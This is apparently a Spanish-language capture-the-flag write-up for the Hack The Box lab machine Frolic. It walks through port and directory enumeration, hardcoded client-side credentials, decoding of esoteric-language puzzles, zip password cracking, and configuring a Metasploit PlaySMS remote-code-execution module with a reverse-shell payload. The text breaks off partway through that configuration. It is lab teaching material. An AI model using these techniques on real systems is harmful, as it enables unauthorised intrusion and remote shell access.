---
title: "HTB write-up: Frolic"
date: 2019-03-23T10:03:22-06:00
description: "Mucho CTF; Lenguajes esotericos, robo de credenciales y finalmente un ret2libc"
tags: ["hackthebox", "htb", "boot2root", "pentesting", "rop", "esolang"]
categories: ["htb", "pentesting"]

---
Esta maquina me ha divertido mucho, inicias con una enumeración normal, te encuentras ante varias puertas y empiezas a tocarlas hasta que una se abre y boom, Ook! esolang. Continuas otro poco y boom, brainfuck. Llegas al fabuloso user.txt, y te topas con un archivo llamado rop. Aquí comienza el exploiting.
<!--more-->

# Machine info

La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![frolic image](https://www.hackthebox.eu/storage/avatars/6eb13dd9cfe9c0b0e64ba78304253aac_thumb.png) [frolic](https://www.hackthebox.eu/home/machines/profile/158) | [felamos](https://www.hackthebox.eu/home/users/profile/27390) | Linux | 10.10.10.111 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-frolic/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -p- 10.10.10.111 --open -v -n
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 13:44 CST
Initiating Ping Scan at 13:44
Scanning 10.10.10.111 [4 ports]
Completed Ping Scan at 13:44, 0.23s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:44
Scanning 10.10.10.111 [65535 ports]
Discovered open port 22/tcp on 10.10.10.111
Discovered open port 139/tcp on 10.10.10.111
Discovered open port 445/tcp on 10.10.10.111
Discovered open port 9999/tcp on 10.10.10.111
Discovered open port 1880/tcp on 10.10.10.111
Completed SYN Stealth Scan at 13:47, 136.66s elapsed (65535 total ports)
Nmap scan report for 10.10.10.111
Host is up (0.18s latency).
Not shown: 65457 closed ports, 73 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1880/tcp open  vsat-control
9999/tcp open  abyss

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 137.06 seconds
           Raw packets sent: 189411 (8.334MB) | Rcvd: 177435 (7.097MB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Corroboremos con `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.111

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-03 16:59:55 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 22/tcp on 10.10.10.111
Discovered open port 1880/tcp on 10.10.10.111
Discovered open port 139/tcp on 10.10.10.111
Discovered open port 445/tcp on 10.10.10.111
Discovered open port 137/udp on 10.10.10.111
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos en TCP, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sS -sV -p22,139,445,1880,9999 10.10.10.111
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 13:50 CST
Nmap scan report for 10.10.10.111
Host is up (0.18s latency).

PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
137/tcp  closed netbios-ns
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
1880/tcp open   http        Node.js (Express middleware)
9999/tcp open   http        nginx 1.10.3 (Ubuntu)
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p22,139,445,1880,9999` para unicamente los puertos que descubrimos anteriormente

Concluimos que tenemos carpetas compartidas, dos servidores Web y uno ssh.

# Gobuster

Vamos a lanzar unos amigables gobuster sobre el puerto TCP/9999 de frolic, concatenando las carpetas descubiertas:

```text
xbytemx@laptop:~$ ~/tools/gobuster -u http://10.10.10.111:9999/ -w ~/git/SecLists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.111:9999/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/01/04 12:49:53 Starting gobuster
=====================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/admin (Status: 301)
/backup (Status: 301)
/dev (Status: 301)
/test (Status: 301)
=====================================================
2019/01/04 12:52:36 Finished
=====================================================
xbytemx@laptop:~$ ~/tools/gobuster -u http://10.10.10.111:9999/admin/ -w ~/git/SecLists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.111:9999/admin/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/01/04 13:03:53 Starting gobuster
=====================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/css (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
=====================================================
2019/01/04 13:07:03 Finished
=====================================================
xbytemx@laptop:~$ ~/tools/gobuster -u http://10.10.10.111:9999/backup/ -w ~/git/SecLists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.111:9999/backup/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/01/04 13:10:04 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/index.php (Status: 200)
/index.php (Status: 200)
/password.txt (Status: 200)
/user.txt (Status: 200)
=====================================================
2019/01/04 13:13:00 Finished
=====================================================
xbytemx@laptop:~$ ~/tools/gobuster -u http://10.10.10.111:9999/dev/ -w ~/git/SecLists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.111:9999/dev/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/01/04 13:20:23 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/backup (Status: 301)
/test (Status: 200)
=====================================================
2019/01/04 13:23:03 Finished
=====================================================
xbytemx@laptop:~$ ~/tools/gobuster -u http://10.10.10.111:9999/test/ -w ~/git/SecLists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.111:9999/test/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/01/04 13:25:23 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/index.php (Status: 200)
/index.php (Status: 200)
=====================================================
2019/01/04 13:27:35 Finished
=====================================================
```

- `-u http://10.10.10.111:9999/` + la carpeta deseada, para indicarle la URL sobre la cual buscara directorios o archivos
- `-w common.txt` para el diccionario en el cual se encuentran los archivos mas comunes a buscar
- `-s '200,204,301,302,307,403,500'` para aceptar los tipos de Status codes como respuesta valida
- `-x php,txt` para no solo buscar carpetas, sino archivos con esa extensión usando el mismo diccionario
- `-t 20` para indicar cuantos hilos estaremos usando para buscar

Tenemos varias respuestas interesantes, pero de momento, enfoquemos nos en la carpeta admin.

# HTTP on admin

Como a mi me gusta mostrar los resultados de las pruebas en lugar de _imágenes_ usemos HTTPie para efectuar la navegación hacia la pagina:

```text
xbytemx@laptop:~$ http http://10.10.10.111:9999/admin/
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Fri, 04 Jan 2019 18:43:59 GMT
ETag: W/"5ba7793f-27a"
Last-Modified: Sun, 23 Sep 2018 11:30:07 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<html>
<head>
<title>Crack me :|</title>
<!-- Include CSS File Here -->
<link rel="stylesheet" href="css/style.css"/>
<!-- Include JS File Here -->
<script src="js/login.js"></script>
</head>
<body>
<div class="container">
<div class="main">
<h2>c'mon i m hackable</h2>
<form id="form_id" method="post" name="myform">
<label>User Name :</label>
<input type="text" name="username" id="username"/>
<label>Password :</label>
<input type="password" name="password" id="password"/>
<input type="button" value="Login" id="submit" onclick="validate()"/>
</form>
<span><b class="note">Note : Nothing</b></span>
</div>
</div>
</body>
</html>
```

Encontramos un form que hace la validación de los usuarios en el portal de admin. Veamos sin encontramos algo en el archivo login.js porque para loggear se ejecuta validate().

```text
xbytemx@laptop:~$ http http://10.10.10.111:9999/admin/js/login.js
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 752
Content-Type: application/javascript
Date: Fri, 04 Jan 2019 18:44:04 GMT
ETag: "5ba77a36-2f0"
Last-Modified: Sun, 23 Sep 2018 11:34:14 GMT
Server: nginx/1.10.3 (Ubuntu)

var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```

Si prestamos atención, tenemos un if donde tenemos unas credenciales hardcodeadas: `username == "admin" && password == "superduperlooperpassword_lol"`. Pero esto es interesante porque la validación se da del lado del cliente y no del servidor, por lo que ¿óomo sabe el servidor si estamos o no estamos autenticados? Bueno, en realidad no lo sabe, por lo que podemos consultar directamente la pagina `success.html`.

# success.html

```text
xbytemx@laptop:~$ http --form http://10.10.10.111:9999/admin/success.html
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Fri, 04 Jan 2019 18:46:38 GMT
ETag: W/"5ba779d1-5f9"
Last-Modified: Sun, 23 Sep 2018 11:32:33 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
!!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
!.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
!!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
.?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
!.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
!.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
!!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
!!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
..!.! !!!!! !.?.
```

WTF... braile? brainfuck? No, no. Ook!

Se trata de otro tipo de lenguaje esotérico, llamado `Ook`, el cual puede ser identificado por los caracteres `.!?`

Afortunadamente existe un paquete en Debian para convertir este tipo de lenguajes, `esco`.

```text
xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/admin/success.html | sed 's/\./Ook\. /g' | sed 's/\!/Ook\! /g' | sed 's/\?/Ook\? /g' > success-resp.OoK
xbytemx@laptop:~/htb/frolic$ ~/git/esco/src/esco -t ook success-resp.OoK
== Begin of execution ==
Nothing here check /asdiSIAJJ0QWE9JAS


== End of execution ==

```

Ok, continuamos nuestro camino hacia la carpeta revelada:

```text
xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Fri, 04 Jan 2019 22:11:43 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
AAAAAAEAAQBPAAAAAwEAAAAA
```

A este si lo conozco, es base64. Realicemos el decoding:

```text
xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | strings
index.phpUT
&q2o
index.phpUT
```

Ah? Sera esto algun archivo?

```text
xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | file -
/dev/stdin: Zip archive data, at least v2.0 to extract
```

Ok, se trata de un ZIP, pasemos la salida a archivo con `xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d > asdiSIAJJ0QWE9JAS.zip` y después al tratarlo de decomprimir nos pedirá una contraseña, la cual no tenemos pero podemos conseguir con john the ripper:

```text
xbytemx@laptop:~/htb/frolic$ ~/git/JohnTheRipper/run/zip2john asdiSIAJJ0QWE9JAS.zip
ver 2.0 efh 5455 efh 7875 asdiSIAJJ0QWE9JAS.zip->index.php PKZIP Encr: 2b chk, TS_chk, cmplen=176, decmplen=617, crc=145BFE23
asdiSIAJJ0QWE9JAS.zip:$pkzip2$1*2*2*0*b0*269*145bfe23*0*43*8*b0*145b*89c3*5e44e6104a9f73b2688a299a1b9550f06e0ba9bf5373e4024a771a11dc8ee5a034e2f6d98f6bee7ad0128a55c896ec2b58ba7fe050c8e112e1b687a4ead0bbe2785f13c04e895bfd8d8453aaea38f283f2e20f914a3253c72a830344d08d7d933864540e51026bde10cad7e3e4fb6a5f9f8bf918e994c027787f6390c216dd8f74beb2373551ac0b9a8a030e95106b032c34b5d96229be3446b5e90609ffba84e396eae9efc72671326f8857d49ce339*$/pkzip2$:::::asdiSIAJJ0QWE9JAS.zip

xbytemx@laptop:~/htb/frolic$ ~/git/JohnTheRipper/run/zip2john asdiSIAJJ0QWE9JAS.zip > asdiSIAJJ0QWE9JAS.hash

xbytemx@laptop:~/htb/frolic$ ~/git/JohnTheRipper/run/john ~/htb/frolic/asdiSIAJJ0QWE9JAS.hash --show
asdiSIAJJ0QWE9JAS.zip:password:::::/home/xbytemx/htb/frolic/asdiSIAJJ0QWE9JAS.zip

1 password hash cracked, 0 left
```

OMG la contraseña es password

Descomprimamos y veamos que hemos conseguido:

```text
xbytemx@laptop:~/htb/frolic$ 7z -ppassword x asdiSIAJJ0QWE9JAS.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4200U CPU @ 1.60GHz (40651),ASM,AES-NI)

Scanning the drive for archives:
1 file, 360 bytes (1 KiB)

Extracting archive: asdiSIAJJ0QWE9JAS.zip
--
Path = asdiSIAJJ0QWE9JAS.zip
Type = zip
Physical Size = 360


Enter password (will not be echoed):
Everything is Ok

Size:       617
Compressed: 360
```

# index.php

Tenemos un archivo llamado index.php (da, era el resultado de success.html):

```text
xbytemx@laptop:~/htb/frolic$ cat index.php
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

Eso parece hexadecimal, porque tenemos algunos `\x0d\x0a` que normalmente indica una nueva linea, por lo que convirtamos estos a ascii:

```text
xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```

Por los caracteres finales de `==` puede ser base64, ya que el encoding de b64 usa un panding con caracteres `=`. Probemos:

```text
xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+base64: entrada inválida
xbytemx@laptop:~/htb/frolic$ man base64
xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r | base64 -di
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

Esta salida no es más que brainfuck, otro lenguaje esotéricos hecho por diversión. Lo podemos reconocer porque esta separado por espacios cada 5 caracteres y sus caracteres principales son `[.+<>]`. Convertimos y ejecutamos este lenguaje por su respectivo interprete:

```text
xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r | base64 -di > index.bf
xbytemx@laptop:~/htb/frolic$ beef index.bf
idkwhatispass

```

Parece que tenemos otras credenciales y hemos llegado a un punto muerto en este path.

# dirb

Como `gobuster` no es la herramienta mas eficiente cuanto se trata de recursividad de carpetas, decidí lanzar `dirb` como una segunda opción:

```text
xbytemx@laptop:~/htb/frolic$ dirb http://10.10.10.111:9999

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Jan  4 14:15:11 2019
URL_BASE: http://10.10.10.111:9999/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.111:9999/ ----
==> DIRECTORY: http://10.10.10.111:9999/admin/
==> DIRECTORY: http://10.10.10.111:9999/backup/
==> DIRECTORY: http://10.10.10.111:9999/dev/
==> DIRECTORY: http://10.10.10.111:9999/test/

---- Entering directory: http://10.10.10.111:9999/admin/ ----
==> DIRECTORY: http://10.10.10.111:9999/admin/css/
+ http://10.10.10.111:9999/admin/index.html (CODE:200|SIZE:634)
==> DIRECTORY: http://10.10.10.111:9999/admin/js/

---- Entering directory: http://10.10.10.111:9999/backup/ ----
+ http://10.10.10.111:9999/backup/index.php (CODE:200|SIZE:28)

---- Entering directory: http://10.10.10.111:9999/dev/ ----
==> DIRECTORY: http://10.10.10.111:9999/dev/backup/
+ http://10.10.10.111:9999/dev/test (CODE:200|SIZE:5)

---- Entering directory: http://10.10.10.111:9999/test/ ----
+ http://10.10.10.111:9999/test/index.php (CODE:502|SIZE:584)

---- Entering directory: http://10.10.10.111:9999/admin/css/ ----

---- Entering directory: http://10.10.10.111:9999/admin/js/ ----

---- Entering directory: http://10.10.10.111:9999/dev/backup/ ----
+ http://10.10.10.111:9999/dev/backup/index.php (CODE:200|SIZE:11)

-----------------
END_TIME: Fri Jan  4 16:11:57 2019
DOWNLOADED: 36896 - FOUND: 5
```

El ultimo resultado llamo mucho mi atención, veamos de que se trata:

```text
xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/dev/backup/
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Fri, 04 Jan 2019 20:14:14 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

/playsms

```

ok, gracias por la información sobre otro directorio que no saldría sino pasar un diccionario realmente GRANDE.

# playsms

Veamos que tenemos en `/playsms`:

```text
xbytemx@laptop:~$ http http://10.10.10.111:9999/playsms/
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Fri, 04 Jan 2019 20:17:33 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: index.php?app=main&inc=core_auth&route=login
Pragma: no-cache
Server: nginx/1.10.3 (Ubuntu)
Set-Cookie: PHPSESSID=f4lnh91b2q1s2totkjqf1bqr30; path=/
Transfer-Encoding: chunked
X-Frame-Options: SAMEORIGIN
```

Interesante, parece que nos hemos topado con algún tipo de aplicación. Investigamos exploits para esta webapp:

```text
xbytemx@laptop:~/git/exploit-database$ ./searchsploit playsms
[i] Found (#1): /home/xbytemx/git/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/home/xbytemx/git/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array:
exploitdb)

[i] Found (#1): /home/xbytemx/git/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/home/xbytemx/git/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array
: exploitdb)

-------------------------------------------------------------------------------- ------------------------------------------------------
 Exploit Title                                                                  |  Path
                                                                                | (/home/xbytemx/git/exploit-database/)
-------------------------------------------------------------------------------- ------------------------------------------------------
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasplo | exploits/php/remote/44598.rb
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upl | exploits/php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                | exploits/php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Meta | exploits/php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                                             | exploits/php/webapps/42038.txt
PlaySms 0.7 - SQL Injection                                                     | exploits/linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                  | exploits/php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                           | exploits/php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                         | exploits/php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                    | exploits/php/webapps/30177.txt
-------------------------------------------------------------------------------- ------------------------------------------------------
Shellcodes: No Result
```

Parece que hay muchas opciones pero de momento desconocemos la versión que tenemos...

Aprovechemos que `metasploit-framework` tiene un exploit para esta versión que genera un RCE:

```text
xbytemx@laptop:~/git/exploit-database$ msfconsole
Found a database at /home/xbytemx/.msf4/db, checking to see if it is started
Starting database at /home/xbytemx/.msf4/db...success


  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v4.17.34-dev-                        ]
+ -- --=[ 1845 exploits - 1045 auxiliary - 320 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search playsms

Matching Modules
================

   Name                                       Disclosure Date  Rank       Check  Description
   ----                                       ---------------  ----       -----  -----------
   exploit/multi/http/playsms_filename_exec   2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Fiel
d Code Execution
   exploit/multi/http/playsms_uploadcsv_exec  2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code
Execution


msf > use exploit/multi/http/playsms_uploadcsv_exec
msf exploit(multi/http/playsms_uploadcsv_exec) > show options

Module options (exploit/multi/http/playsms_uploadcsv_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4

msf exploit(multi/http/playsms_uploadcsv_exec) > set PASSWORD idkwhatispass
PASSWORD => idkwhatispass
msf exploit(multi/http/playsms_uploadcsv_exec) > set RHOST 10.10.10.111
RHOST => 10.10.10.111
msf exploit(multi/http/playsms_uploadcsv_exec) > set RPORT 9999
RPORT => 9999
msf exploit(multi/http/playsms_uploadcsv_exec) > set TARGETURI /playsms/
TARGETURI => /playsms/
msf exploit(multi/http/playsms_uploadcsv_exec) > set LHOST tun0
LHOST => 10.10.15.126
msf exploit(multi/http/playsms_uploadcsv_exec) > set LPORT 3001
LPORT => 3001
